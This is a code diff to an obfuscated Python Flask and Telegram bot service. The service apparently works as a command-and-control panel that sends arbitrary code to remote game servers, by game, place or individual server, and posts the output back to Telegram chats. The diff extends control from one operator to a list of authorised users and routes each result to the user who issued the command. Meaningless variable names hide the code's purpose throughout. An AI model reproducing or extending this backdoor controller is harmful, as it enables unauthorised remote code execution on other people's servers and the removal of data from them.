@@ -1,10 +1,12 @@
-# -*- coding: utf-8 -*-
 from flask import Flask, request, jsonify
 import threading, time, requests, os, io, json
 
 _k1 = os.environ.get("kek", "")
 _k2 = int(os.environ.get("pep", "0"))
 _k3 = os.environ.get("beb", "")
+_k4 = [int(x) for x in os.environ.get("users", "").split(",") if x.strip()]
+if _k2 not in _k4:
+    _k4.append(_k2)
 
 if not _k1 or not _k2 or not _k3:
     raise SystemExit("Config missing")
@@ -96,8 +98,9 @@ def _h3():
         })
     return jsonify({"ok": True})
 
-def _s1(_t, _kb=None):
-    _data = {"chat_id": _k2, "text": _t[:4000]}
+def _s1(_t, _kb=None, _to=None):
+    _target = _to if _to else _k2
+    _data = {"chat_id": _target, "text": _t[:4000]}
     if _kb:
         _data["reply_markup"] = json.dumps(_kb)
     try:
@@ -106,17 +109,19 @@ def _s1(_t, _kb=None):
     except Exception as _e:
         print("Err:", _e)
 
-def _s2(_n, _c):
+def _s2(_n, _c, _to=None):
+    _target = _to if _to else _k2
     try:
         requests.post("https://api.telegram.org/bot" + _k1 + "/sendDocument",
-                      data={"chat_id": _k2, "caption": _n},
+                      data={"chat_id": _target, "caption": _n},
                       files={"document": (_n, io.BytesIO(_c.encode("utf-8")), "text/plain")},
                       timeout=30)
     except Exception as _e:
         print("Err:", _e)
 
-def _edit(_mid, _t, _kb=None):
-    _data = {"chat_id": _k2, "message_id": _mid, "text": _t[:4000]}
+def _edit(_mid, _t, _kb=None, _to=None):
+    _target = _to if _to else _k2
+    _data = {"chat_id": _target, "message_id": _mid, "text": _t[:4000]}
     if _kb:
         _data["reply_markup"] = json.dumps(_kb)
     try:
@@ -185,21 +190,21 @@ def _p1():
                     _cid = _cb["message"]["chat"]["id"]
                     _mid = _cb["message"]["message_id"]
 
-                    if _cid == _k2:
+                    if _cid in _k4:
                         if _cdata == "menu:games":
                             _t, _kb = _menu_games()
-                            _edit(_mid, _t, _kb)
+                            _edit(_mid, _t, _kb, _cid)
                         elif _cdata.startswith("menu:game:"):
                             _p = _cdata.split(":", 2)[2]
                             _t, _kb = _menu_game(_p)
-                            _edit(_mid, _t, _kb)
+                            _edit(_mid, _t, _kb, _cid)
                         elif _cdata.startswith("use:"):
                             _, _p, _j = _cdata.split(":", 2)
                             if _p == "all":
                                 _b1["target"] = "all"
                                 _b1["place"] = None
                                 _b1["job"] = None
-                                _edit(_mid, "Target: All Games", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]})
+                                _edit(_mid, "Target: All Games", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]}, _cid)
                             elif _j == "all":
                                 _b1["target"] = "place"
                                 _b1["place"] = _p
@@ -207,7 +212,7 @@ def _p1():
                                 try: _p_i = int(_p)
                                 except: _p_i = _p
                                 _nm = _a5.get(_p_i, {}).get("name", _p)
-                                _edit(_mid, f"Target: {_nm}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
+                                _edit(_mid, f"Target: {_nm}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]}, _cid)
                             else:
                                 _b1["target"] = "job"
                                 _b1["place"] = _p
@@ -217,7 +222,7 @@ def _p1():
                                 _ji = _a5.get(_p_i, {}).get("jobs", {}).get(_j, {})
                                 _idx = _ji.get("idx")
                                 _label = f"Server {_idx}" if _idx else "Server"
-                                _edit(_mid, f"Target: {_label}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
+                                _edit(_mid, f"Target: {_label}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]}, _cid)
                     try:
                         requests.post("https://api.telegram.org/bot" + _k1 + "/answerCallbackQuery",
                                       data={"callback_query_id": _cb["id"]})
@@ -227,52 +232,52 @@ def _p1():
                 _m = _u.get("message") or {}
                 _c = (_m.get("chat") or {}).get("id")
                 _x = (_m.get("text") or "").strip()
-                if _c != _k2 or not _x: continue
+                if _c not in _k4 or not _x: continue
 
                 if _x == "/start":
                     _s1("ServerSide control\n\n"
                         "/games   Active games\n"
                         "/current Current target\n"
                         "/reset   Target = all\n\n"
-                        "Plain text executes on the current target."); continue
+                        "Plain text executes on the current target.", None, _c); continue
 
                 if _x == "/games":
                     _t, _kb = _menu_games()
-                    _s1(_t, _kb)
+                    _s1(_t, _kb, _c)
                     continue
 
                 if _x == "/current":
-                    _s1(f"Target: {_b1['target']}\nGame: {_b1['place']}\nServer: {_b1['job']}")
+                    _s1(f"Target: {_b1['target']}\nGame: {_b1['place']}\nServer: {_b1['job']}", None, _c)
                     continue
 
                 if _x == "/reset":
                     _b1["target"] = "all"; _b1["place"] = None; _b1["job"] = None
-                    _s1("Target: All Games"); continue
+                    _s1("Target: All Games", None, _c); continue
 
                 if _x.startswith("all "):
                     _code = _x[4:]
                     with _a4:
-                        _a2.append({"cmd": _code, "target": "all", "ts": time.time()})
-                    _s1("Sent: All Games")
+                        _a2.append({"cmd": _code, "target": "all", "ts": time.time(), "by": _c})
+                    _s1("Sent: All Games", None, _c)
                     continue
 
                 _t = _b1["target"]
                 if _t == "all":
                     with _a4:
-                        _a2.append({"cmd": _x, "target": "all", "ts": time.time()})
-                    _s1("Sent: All Games")
+                        _a2.append({"cmd": _x, "target": "all", "ts": time.time(), "by": _c})
+                    _s1("Sent: All Games", None, _c)
                 elif _t == "place":
                     with _a4:
-                        _a2.append({"cmd": _x, "target": "place", "place": _b1["place"], "ts": time.time()})
-                    _s1("Sent: All Servers")
+                        _a2.append({"cmd": _x, "target": "place", "place": _b1["place"], "ts": time.time(), "by": _c})
+                    _s1("Sent: All Servers", None, _c)
                 elif _t == "job":
                     with _a4:
-                        _a2.append({"cmd": _x, "target": "job", "job": _b1["job"], "ts": time.time()})
+                        _a2.append({"cmd": _x, "target": "job", "job": _b1["job"], "ts": time.time(), "by": _c})
                     try: _p_i = int(_b1["place"])
                     except: _p_i = _b1["place"]
                     _ji = _a5.get(_p_i, {}).get("jobs", {}).get(_b1["job"], {})
                     _idx = _ji.get("idx")
-                    _s1(f"Sent: Server {_idx}" if _idx else "Sent: Server")
+                    _s1(f"Sent: Server {_idx}" if _idx else "Sent: Server", None, _c)
         except Exception as _e:
             print("Err:", _e)
             time.sleep(3)
@@ -291,6 +296,7 @@ def _p2():
             _o = (_x.get("out") or "").strip()
             _pl = _x.get("place", 0)
             _j = _x.get("job", "?")
+            _by = _x.get("by", _k2)
             with _a4:
                 _info = _a5.get(_pl, {})
                 _nm = _info.get("name", str(_pl))
@@ -307,12 +313,12 @@ def _p2():
                 else:
                     _tag = f"[{_nm}/Server/{_mode}]"
             if _o.startswith("compile err:") or _o.startswith("runtime err:"):
-                _s1(f"{_tag} Error\n{_o}")
+                _s1(f"{_tag} Error\n{_o}", None, _by)
             else:
                 if not _o or _o == "nil":
-                    _s1(f"{_tag} Done")
+                    _s1(f"{_tag} Done", None, _by)
                 else:
-                    _s2("result.txt", f"{_tag} $ {_c}\n\n{_o}")
+                    _s2("result.txt", f"{_tag} $ {_c}\n\n{_o}", _by)
 
 threading.Thread(target=_p1, daemon=True).start()
 threading.Thread(target=_p2, daemon=True).start()
